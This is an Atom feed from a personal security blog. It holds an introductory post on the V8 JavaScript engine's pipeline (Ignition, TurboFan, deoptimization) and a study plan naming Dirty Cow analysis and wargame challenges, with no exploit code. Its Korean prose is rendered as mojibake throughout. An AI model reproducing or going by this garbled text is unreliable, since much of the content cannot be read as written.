<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://ainset.in//feed.xml" rel="self" type="application/atom+xml" /><link href="https://ainset.in//" rel="alternate" type="text/html" /><updated>2022-06-28T13:06:39+09:00</updated><id>https://ainset.in//feed.xml</id><title type="html">Ainsetin ğŸ‡°ğŸ‡· âš¡</title><subtitle>I don wanna be a newbie... Try to be the Expert!
</subtitle><author><name>Ainsetin</name></author><entry><title type="html">[V8 Study] 00-introduction</title><link href="https://ainset.in//v8-introduction.html" rel="alternate" type="text/html" title="[V8 Study] 00-introduction" /><published>2022-05-17T16:30:00+09:00</published><updated>2022-05-17T16:30:00+09:00</updated><id>https://ainset.in//V8-introduction</id><content type="html" xml:base="https://ainset.in//v8-introduction.html">&lt;p&gt;&lt;strong&gt;[!] ìš°ì„ ì ìœ¼ë¡œ í•œê¸€ë¡œ ì‘ì„±í•˜ì—¬ ì¶”í›„ ë²ˆì—­í•  ì˜ˆì •.&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;ìš°ë¦¬ê°€ ëŒ€ì¤‘ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” Google Chrome browserì—ëŠ” ì›¹í˜ì´ì§€ë¥¼ ë™ì ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ javascriptê°€ êµ¬ë™ë  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ê³  ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´, JSë¥¼ ì›í™œí•˜ê²Œ ì‹¤í–‰í•˜ê³  ì»´íŒŒì¼í•˜ëŠ” ì—­í• ì€ ì–´ë–¤ ê²ƒì´ ë§¡ê³  ìˆì„ê¹Œ? ì´ ì±•í„°ì—ì„œëŠ” ë‚´ê°€ ê³µë¶€í–ˆë˜ chromium javascript engineì¸ V8ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³ ì í•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;v8ì˜-êµ¬ì¡°ëŠ”-ì–´ë–»ê²Œ-ë˜ì–´-ìˆì„ê¹Œ&quot;&gt;V8ì˜ êµ¬ì¡°ëŠ” ì–´ë–»ê²Œ ë˜ì–´ ìˆì„ê¹Œ?&lt;/h2&gt;

&lt;p&gt;V8ê°™ì€ ê²½ìš° Chrome êµ¬ë™ ì‹œ í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ì‹¤í–‰ë˜ì–´ heap ë° stack ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê´€ë¦¬í•˜ë©´ì„œ Javascriptì˜ ê°ì¢… ë³€ìˆ˜ì™€ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ í•µì‹¬ì ì¸ execution fileë¡œ ë™ì‘í•œë‹¤. ì´ì™¸ì— Task/Callback queue, Microtask queue, WebAPI ë“± ë‹¤ì–‘í•œ ìš”ì†Œê°€ Chromium browserë¥¼ êµ¬ì„±í•˜ê³  ë™ì‘í•˜ëŠ”ë° ì‚¬ìš©ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ê°€ì¥ ëŒ€í‘œì ì¸ ì—­í• ì€ javascript ì½”ë“œë¥¼ ì»´íŒŒì¼ëœ ì»´í“¨í„°ì— ìµœì í™”ëœ ì½”ë“œë¡œ ë³€í™˜ì‹œì¼œ ì „ë‹¬í•˜ê²Œ ëœë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë•Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JIT(Just-In-Time) Compiler&lt;/code&gt;ë¼ëŠ” ë…ì°½ì ì¸ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;v8ë§Œì˜-íŠ¹ì§•ì€-ë¬´ì—‡ì´-ìˆì„ê¹Œ&quot;&gt;V8ë§Œì˜ íŠ¹ì§•ì€ ë¬´ì—‡ì´ ìˆì„ê¹Œ?&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/images/2022-V8/intro/inter-comp.png&quot; alt=&quot;inter-comp.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìš°ì„  ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•´ ì•Œì•„ì•¼ í•  ê²ƒì´ë‹¤.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ì¸í„°í”„ë¦¬í„°
    &lt;ul&gt;
      &lt;li&gt;ì¥ì  : í•œ ì¤„ í•œ ì¤„ ë³€í™˜í•˜ê¸° ë•Œë¬¸ì— ì‹¤í–‰ ì†ë„ê°€ ë¹ ë¥´ë‹¤.&lt;/li&gt;
      &lt;li&gt;ë‹¨ì  : ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ë³µì¡í•´ì§ˆìˆ˜ë¡ ì ì  ì†ë„ê°€ ëŠë ¤ì§„ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê°™ì€ ì½”ë“œë¥¼ ì—¬ëŸ¬ì°¨ë¡€ ë°˜ë³µí•˜ëŠ” ë°˜ë³µë¬¸ì˜ ê²½ìš°, ê°™ì€ ê²°ê³¼ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì½”ë“œë¥¼ í•œ ì¤„ í•œ ì¤„ ì½ëŠ” ë°©ì‹ì— ì˜í•´ ê·¸ë•Œê·¸ë•Œ ì‹¤í–‰ëœë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ì»´íŒŒì¼ëŸ¬
    &lt;ul&gt;
      &lt;li&gt;ì¥ì  : íŒŒì¼ ì „ì²´ë¥¼ í•œë²ˆì— ì½ì–´ì„œ ì»´íŒŒì¼ëŸ¬ëŠ” ì‘ì—…ì„ ë‹¨ìˆœí™”ì‹œí‚¨ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • í•¨ìˆ˜ë¥¼ 10ì–µë²ˆ ë°˜ë³µí•´ì•¼ í•  ê²½ìš°, ì»´íŒŒì¼ ê³¼ì •ì—ì„œ í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ í•¨ìˆ˜ì˜ ê²°ê³¼ë¬¼ì„ ë°˜ë³µí•˜ë„ë¡ ì»´íŒŒì¼ í•œë‹¤. ì´ì²˜ëŸ¼ ë¶ˆí•„ìš”í•œ ë™ì‘ì„ ì œê±°í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ë°©ì‹ì„ ìµœì í™”, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;optimization&lt;/code&gt;ì´ë¼ê³  í•œë‹¤. (&lt;em&gt;ì¸í„°í”„ë¦¬í„°ëŠ” optimizeí•˜ì§€ ì•ŠëŠ”ë‹¤&lt;/em&gt; )&lt;/li&gt;
      &lt;li&gt;ë‹¨ì  : ì½”ë“œë¥¼ ë°”ë¡œ ì‹¤í–‰í•˜ì§€ ì•Šê³ , ì½”ë“œ ì‹¤í–‰ ì „ ì „ì²´ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì´ˆê¸°ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì˜ ë‚´ë¶€ë¥¼ ê³µë¶€í•˜ë‹¤ê°€ ì ì‹œ ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì˜ ê°„ë‹¨í•œ ê°œë…ê³¼ ì¥ë‹¨ì ì„ ì§šì–´ë´¤ë‹¤. ê·¸ëŸ¬ë©´ ê³¼ì—° V8 ì—”ì§„ì€ ì–´ë–¤ ë°©ì‹ì„ ì·¨í–ˆê¸¸ë˜ ë‹¤ë¥¸ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ë³´ë‹¤ ë” ë¹ ë¥´ê³  íš¨ìœ¨ì ìœ¼ë¡œ ìë°”ìŠ¤í¬ë¦½íŠ¸ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ? ë°”ë¡œ ì—¬ê¸°ì—ì„œ V8 ì—”ì§„ì˜ ë…íŠ¹í•œ ì–¸ì–´ ë³€í™˜ ë„êµ¬ì¸ JIT Compilerê°€ ë“¤ì–´ì˜¨ë‹¤. JITì€ Just In Timeì˜ ì•½ìì´ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;jit-compilerì˜-êµ¬ì¡°&quot;&gt;JIT Compilerì˜ êµ¬ì¡°&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/images/2022-V8/intro/jit.png&quot; alt=&quot;jit.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;V8 ì—”ì§„ì€ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parser&lt;/code&gt; : ì½”ë“œë¥¼ Lexical Analysisë¼ëŠ” ê³¼ì •ì„ í†µí•´ &lt;strong&gt;í† í°&lt;/strong&gt;ìœ¼ë¡œ ë¶„í•´í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AST(Abstract Syntax Tree)&lt;/code&gt; : Parserì—ì„œ ë¶„í•´ëœ í† í°ì„ ë°”íƒ•ìœ¼ë¡œ ì¶”ìƒì ì¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ignition&lt;/code&gt; : ASTì—ì„œ ë‚˜ì˜¨ íŠ¸ë¦¬ë¥¼ V8ì˜ ì¸í„°í”„ë¦¬í„°ì¸ ignitionì—ê²Œ ì „ë‹¬í•˜ê³  ì´ê²ƒì„ ì¸í„°í”„ë¦¬í„°ëŠ” bytecodeë¡œ ë³€í™˜ì‹œí‚¨ë‹¤. (High-level Lang to Low-level Lang)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TurboFan&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Profiler&lt;/code&gt; : bytecodeë¥¼ ì‹¤í–‰í•˜ì—¬ Human-readable Langì„ ì‹¤í–‰ì‹œí‚¤ê³ , ê·¸ì¤‘ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ê³  íŒë³„ëœ ì½”ë“œ ì¡°ê°ì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TurboFan&lt;/code&gt;ìœ¼ë¡œ ë³´ë‚´ì ¸ ìµœì í™”ë¥¼ ìˆ˜í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì»´íŒŒì¼ëœ ì½”ë“œë¡œ ì¬êµ¬ì„±ëœë‹¤. (ì´ë•Œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ëŠ” ë§ì´ ë§¤ìš° ì¶”ìƒì ì´ë¯€ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Profiler&lt;/code&gt; ë¼ëŠ” ì¹œêµ¬í•œí…Œ ì‚¬ìš© ë¹ˆë„ ìˆ˜ ë“±ì„ ìˆ˜ì§‘í•˜ê²Œë” ì—­í• ì„ ë¶€ì—¬í•˜ê³ , ëª¨ì¸ ë°ì´í„°ë¥¼ í†µí•´ Turbofanì˜ ì•Œê³ ë¦¬ì¦˜ëŒ€ë¡œ ìµœì í™”ë¥¼ í•œë‹¤)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;turbofanì€-ì–´ë–¤-ì¡°ê±´ìœ¼ë¡œ-ìµœì í™”í•˜ëŠ”-ê±¸ê¹Œ&quot;&gt;Turbofanì€ ì–´ë–¤ ì¡°ê±´ìœ¼ë¡œ ìµœì í™”í•˜ëŠ” ê±¸ê¹Œ?&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;ì½”ë“œê°€ ëœ¨ê²ê³  ì•ˆì •ì ì¸ ê²ƒ, ì‰½ê²Œ ë§í•˜ë©´ ìì£¼ í˜¸ì¶œë˜ê³ (ëœ¨ê²ê³ ) ì½”ë“œê°€ ì•ˆ ë³€í•¨(ì•ˆì •ì )ì´ë¼ëŠ” ê²ƒì´ë‹¤. ë§¤ë²ˆ ê°™ì€ í–‰ë™ì„ ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ ë‚´ì— ìˆëŠ” ì½”ë“œ ê°™ì€ ê²½ìš°ê°€ ì—¬ê¸°ì— í•´ë‹¹í•˜ê¸° ì‰½ë‹¤.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì¸í„°í”„ë¦¬íŒ…ëœ ë°”ì´íŠ¸ ì½”ë“œì˜ ê¸¸ì´ë¥¼ ë³´ê³  íŠ¹ì • ì„ê³„ì ì„ ë„˜ê¸°ì§€ ì•Šìœ¼ë©´ ì‘ì€ í•¨ìˆ˜ë¼ê³  íŒë‹¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì‘ê³  ë‹¨ìˆœí•œ í•¨ìˆ˜ëŠ” í¬ê³  ë³µì¡í•œ í•¨ìˆ˜ë³´ë‹¤ ë™ì‘ì´ ë§¤ìš° ì¶”ìƒì ì´ê±°ë‚˜ ì œí•œì ì¸ í™•ë¥ ì´ ë†’ê¸° ë•Œë¬¸ì— ì•ˆì •ì ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;[!] ê·¸ëŸ¬ë‚˜, ì»´íŒŒì¼ëŸ¬ëŠ” 100% ì™„ë²½í•˜ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë°œì í™”(deoptimization)ê°€ ì¼ì–´ë‚  ìˆ˜ë„ ìˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;next-topic&quot;&gt;Next Topic&lt;/h2&gt;
&lt;p&gt;ë‹¤ìŒì—ëŠ” V8ì—ì„œ ìë£Œí˜•ì´ë‚˜ JSì˜ ë‹¤ì–‘í•œ ë©”ì†Œë“œê°€ ì–´ë–¤ ì‹ìœ¼ë¡œ ì €ì¥ì´ ë˜ê³  ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì•Œì•„ë³´ê³ ì í•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://dkwjdi.tistory.com/194&quot;&gt;https://dkwjdi.tistory.com/194&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danbev/learning-v8/blob/master/notes/intro.md&quot;&gt;https://github.com/danbev/learning-v8/blob/master/notes/intro.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Ainsetin</name></author><category term="V8" /><summary type="html">[!] ìš°ì„ ì ìœ¼ë¡œ í•œê¸€ë¡œ ì‘ì„±í•˜ì—¬ ì¶”í›„ ë²ˆì—­í•  ì˜ˆì •. Summary ìš°ë¦¬ê°€ ëŒ€ì¤‘ì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” Google Chrome browserì—ëŠ” ì›¹í˜ì´ì§€ë¥¼ ë™ì ìœ¼ë¡œ ì‹¤í–‰ì‹œí‚¤ê¸° ìœ„í•´ javascriptê°€ êµ¬ë™ë  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ê³  ìˆë‹¤. ê·¸ë ‡ë‹¤ë©´, JSë¥¼ ì›í™œí•˜ê²Œ ì‹¤í–‰í•˜ê³  ì»´íŒŒì¼í•˜ëŠ” ì—­í• ì€ ì–´ë–¤ ê²ƒì´ ë§¡ê³  ìˆì„ê¹Œ? ì´ ì±•í„°ì—ì„œëŠ” ë‚´ê°€ ê³µë¶€í–ˆë˜ chromium javascript engineì¸ V8ì— ëŒ€í•´ì„œ ì•Œì•„ë³´ê³ ì í•œë‹¤. V8ì˜ êµ¬ì¡°ëŠ” ì–´ë–»ê²Œ ë˜ì–´ ìˆì„ê¹Œ? V8ê°™ì€ ê²½ìš° Chrome êµ¬ë™ ì‹œ í•˜ë‚˜ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ì‹¤í–‰ë˜ì–´ heap ë° stack ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê´€ë¦¬í•˜ë©´ì„œ Javascriptì˜ ê°ì¢… ë³€ìˆ˜ì™€ ë©”ì†Œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ í•µì‹¬ì ì¸ execution fileë¡œ ë™ì‘í•œë‹¤. ì´ì™¸ì— Task/Callback queue, Microtask queue, WebAPI ë“± ë‹¤ì–‘í•œ ìš”ì†Œê°€ Chromium browserë¥¼ êµ¬ì„±í•˜ê³  ë™ì‘í•˜ëŠ”ë° ì‚¬ìš©ëœë‹¤. ê°€ì¥ ëŒ€í‘œì ì¸ ì—­í• ì€ javascript ì½”ë“œë¥¼ ì»´íŒŒì¼ëœ ì»´í“¨í„°ì— ìµœì í™”ëœ ì½”ë“œë¡œ ë³€í™˜ì‹œì¼œ ì „ë‹¬í•˜ê²Œ ëœë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë•Œ JIT(Just-In-Time) Compilerë¼ëŠ” ë…ì°½ì ì¸ ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•œë‹¤. V8ë§Œì˜ íŠ¹ì§•ì€ ë¬´ì—‡ì´ ìˆì„ê¹Œ? ìš°ì„  ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì— ëŒ€í•´ ì•Œì•„ì•¼ í•  ê²ƒì´ë‹¤. ì¸í„°í”„ë¦¬í„° ì¥ì  : í•œ ì¤„ í•œ ì¤„ ë³€í™˜í•˜ê¸° ë•Œë¬¸ì— ì‹¤í–‰ ì†ë„ê°€ ë¹ ë¥´ë‹¤. ë‹¨ì  : ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ë³µì¡í•´ì§ˆìˆ˜ë¡ ì ì  ì†ë„ê°€ ëŠë ¤ì§„ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ê°™ì€ ì½”ë“œë¥¼ ì—¬ëŸ¬ì°¨ë¡€ ë°˜ë³µí•˜ëŠ” ë°˜ë³µë¬¸ì˜ ê²½ìš°, ê°™ì€ ê²°ê³¼ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì„ì—ë„ ë¶ˆêµ¬í•˜ê³  ì½”ë“œë¥¼ í•œ ì¤„ í•œ ì¤„ ì½ëŠ” ë°©ì‹ì— ì˜í•´ ê·¸ë•Œê·¸ë•Œ ì‹¤í–‰ëœë‹¤. ì»´íŒŒì¼ëŸ¬ ì¥ì  : íŒŒì¼ ì „ì²´ë¥¼ í•œë²ˆì— ì½ì–´ì„œ ì»´íŒŒì¼ëŸ¬ëŠ” ì‘ì—…ì„ ë‹¨ìˆœí™”ì‹œí‚¨ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • í•¨ìˆ˜ë¥¼ 10ì–µë²ˆ ë°˜ë³µí•´ì•¼ í•  ê²½ìš°, ì»´íŒŒì¼ ê³¼ì •ì—ì„œ í•¨ìˆ˜ë¥¼ ë°˜ë³µí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ í•¨ìˆ˜ì˜ ê²°ê³¼ë¬¼ì„ ë°˜ë³µí•˜ë„ë¡ ì»´íŒŒì¼ í•œë‹¤. ì´ì²˜ëŸ¼ ë¶ˆí•„ìš”í•œ ë™ì‘ì„ ì œê±°í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ì˜ ë°©ì‹ì„ ìµœì í™”, optimizationì´ë¼ê³  í•œë‹¤. (ì¸í„°í”„ë¦¬í„°ëŠ” optimizeí•˜ì§€ ì•ŠëŠ”ë‹¤ ) ë‹¨ì  : ì½”ë“œë¥¼ ë°”ë¡œ ì‹¤í–‰í•˜ì§€ ì•Šê³ , ì½”ë“œ ì‹¤í–‰ ì „ ì „ì²´ë¥¼ ì»´íŒŒì¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì´ˆê¸°ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ë°–ì— ì—†ë‹¤. ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì˜ ë‚´ë¶€ë¥¼ ê³µë¶€í•˜ë‹¤ê°€ ì ì‹œ ì¸í„°í”„ë¦¬í„°ì™€ ì»´íŒŒì¼ëŸ¬ì˜ ê°„ë‹¨í•œ ê°œë…ê³¼ ì¥ë‹¨ì ì„ ì§šì–´ë´¤ë‹¤. ê·¸ëŸ¬ë©´ ê³¼ì—° V8 ì—”ì§„ì€ ì–´ë–¤ ë°©ì‹ì„ ì·¨í–ˆê¸¸ë˜ ë‹¤ë¥¸ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ë³´ë‹¤ ë” ë¹ ë¥´ê³  íš¨ìœ¨ì ìœ¼ë¡œ ìë°”ìŠ¤í¬ë¦½íŠ¸ ëª…ë ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ? ë°”ë¡œ ì—¬ê¸°ì—ì„œ V8 ì—”ì§„ì˜ ë…íŠ¹í•œ ì–¸ì–´ ë³€í™˜ ë„êµ¬ì¸ JIT Compilerê°€ ë“¤ì–´ì˜¨ë‹¤. JITì€ Just In Timeì˜ ì•½ìì´ë‹¤. JIT Compilerì˜ êµ¬ì¡° V8 ì—”ì§„ì€ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì¡°ë¡œ ë˜ì–´ ìˆë‹¤. Parser : ì½”ë“œë¥¼ Lexical Analysisë¼ëŠ” ê³¼ì •ì„ í†µí•´ í† í°ìœ¼ë¡œ ë¶„í•´í•œë‹¤. AST(Abstract Syntax Tree) : Parserì—ì„œ ë¶„í•´ëœ í† í°ì„ ë°”íƒ•ìœ¼ë¡œ ì¶”ìƒì ì¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•œë‹¤. Ignition : ASTì—ì„œ ë‚˜ì˜¨ íŠ¸ë¦¬ë¥¼ V8ì˜ ì¸í„°í”„ë¦¬í„°ì¸ ignitionì—ê²Œ ì „ë‹¬í•˜ê³  ì´ê²ƒì„ ì¸í„°í”„ë¦¬í„°ëŠ” bytecodeë¡œ ë³€í™˜ì‹œí‚¨ë‹¤. (High-level Lang to Low-level Lang) TurboFan, Profiler : bytecodeë¥¼ ì‹¤í–‰í•˜ì—¬ Human-readable Langì„ ì‹¤í–‰ì‹œí‚¤ê³ , ê·¸ì¤‘ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ê³  íŒë³„ëœ ì½”ë“œ ì¡°ê°ì€ TurboFanìœ¼ë¡œ ë³´ë‚´ì ¸ ìµœì í™”ë¥¼ ìˆ˜í–‰í•˜ì—¬ ìƒˆë¡œìš´ ì»´íŒŒì¼ëœ ì½”ë“œë¡œ ì¬êµ¬ì„±ëœë‹¤. (ì´ë•Œ ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¼ëŠ” ë§ì´ ë§¤ìš° ì¶”ìƒì ì´ë¯€ë¡œ Profiler ë¼ëŠ” ì¹œêµ¬í•œí…Œ ì‚¬ìš© ë¹ˆë„ ìˆ˜ ë“±ì„ ìˆ˜ì§‘í•˜ê²Œë” ì—­í• ì„ ë¶€ì—¬í•˜ê³ , ëª¨ì¸ ë°ì´í„°ë¥¼ í†µí•´ Turbofanì˜ ì•Œê³ ë¦¬ì¦˜ëŒ€ë¡œ ìµœì í™”ë¥¼ í•œë‹¤) Turbofanì€ ì–´ë–¤ ì¡°ê±´ìœ¼ë¡œ ìµœì í™”í•˜ëŠ” ê±¸ê¹Œ? ì½”ë“œê°€ ëœ¨ê²ê³  ì•ˆì •ì ì¸ ê²ƒ, ì‰½ê²Œ ë§í•˜ë©´ ìì£¼ í˜¸ì¶œë˜ê³ (ëœ¨ê²ê³ ) ì½”ë“œê°€ ì•ˆ ë³€í•¨(ì•ˆì •ì )ì´ë¼ëŠ” ê²ƒì´ë‹¤. ë§¤ë²ˆ ê°™ì€ í–‰ë™ì„ ìˆ˜í–‰í•˜ëŠ” ë°˜ë³µë¬¸ ë‚´ì— ìˆëŠ” ì½”ë“œ ê°™ì€ ê²½ìš°ê°€ ì—¬ê¸°ì— í•´ë‹¹í•˜ê¸° ì‰½ë‹¤. ì¸í„°í”„ë¦¬íŒ…ëœ ë°”ì´íŠ¸ ì½”ë“œì˜ ê¸¸ì´ë¥¼ ë³´ê³  íŠ¹ì • ì„ê³„ì ì„ ë„˜ê¸°ì§€ ì•Šìœ¼ë©´ ì‘ì€ í•¨ìˆ˜ë¼ê³  íŒë‹¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì‘ê³  ë‹¨ìˆœí•œ í•¨ìˆ˜ëŠ” í¬ê³  ë³µì¡í•œ í•¨ìˆ˜ë³´ë‹¤ ë™ì‘ì´ ë§¤ìš° ì¶”ìƒì ì´ê±°ë‚˜ ì œí•œì ì¸ í™•ë¥ ì´ ë†’ê¸° ë•Œë¬¸ì— ì•ˆì •ì ì´ë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤. [!] ê·¸ëŸ¬ë‚˜, ì»´íŒŒì¼ëŸ¬ëŠ” 100% ì™„ë²½í•˜ì§€ ëª»í•˜ê¸° ë•Œë¬¸ì— ì˜ë„ì™€ ë‹¤ë¥´ê²Œ ë°œì í™”(deoptimization)ê°€ ì¼ì–´ë‚  ìˆ˜ë„ ìˆë‹¤. Next Topic ë‹¤ìŒì—ëŠ” V8ì—ì„œ ìë£Œí˜•ì´ë‚˜ JSì˜ ë‹¤ì–‘í•œ ë©”ì†Œë“œê°€ ì–´ë–¤ ì‹ìœ¼ë¡œ ì €ì¥ì´ ë˜ê³  ë¶ˆëŸ¬ì˜¬ ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì•Œì•„ë³´ê³ ì í•œë‹¤. reference https://dkwjdi.tistory.com/194 https://github.com/danbev/learning-v8/blob/master/notes/intro.md</summary></entry><entry><title type="html">Personal R&amp;amp;D plan beginning from â€˜nowâ€™</title><link href="https://ainset.in//list-after-graduate.html" rel="alternate" type="text/html" title="Personal R&amp;amp;D plan beginning from â€˜nowâ€™" /><published>2021-11-08T17:00:00+09:00</published><updated>2021-11-08T17:00:00+09:00</updated><id>https://ainset.in//list-after-graduate</id><content type="html" xml:base="https://ainset.in//list-after-graduate.html">&lt;p&gt;This is my plan to be finished until/after graduating.&lt;/p&gt;

&lt;h2 id=&quot;research&quot;&gt;Research&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;Â§ must be finished until new yearâ€™s day Â§&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;Kernel : Dirty Cow Analysis (CVE-2016-5195) -processing&lt;/li&gt;
    &lt;li&gt;&lt;del&gt;Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete&lt;/del&gt;&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;develop&quot;&gt;Develop&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;Â§ new year STUDY plan Â§&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;Making interpreter/compiler with Rust -in progress :D (With Chris Ohk, ..)&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;goal&quot;&gt;Goal&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;Try something &lt;strong&gt;â€œnewâ€&lt;/strong&gt;, &lt;a href=&quot;https://youtu.be/c6rP-YP4c5I&quot;&gt;&lt;strong&gt;Try Everything&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;del&gt;Pass any awesome Univ.â€™s admission (Complete)&lt;/del&gt;&lt;/li&gt;
    &lt;li&gt;&lt;del&gt;Pass drive license (Complete)&lt;/del&gt;&lt;/li&gt;
    &lt;li&gt;Dreamhack Wargame 1st
      &lt;ul&gt;
        &lt;li&gt;Format Sniper (Learn &amp;amp; Analyze about FSB)&lt;/li&gt;
        &lt;li&gt;Dreamcurl (Rev O, Crypto X. So learn mathematics!)&lt;/li&gt;
        &lt;li&gt;&lt;del&gt;Unibitmap (Solved :D)&lt;/del&gt;&lt;/li&gt;
        &lt;li&gt;&lt;del&gt;dreamboard v2 (V8 : Solved :D)&lt;/del&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
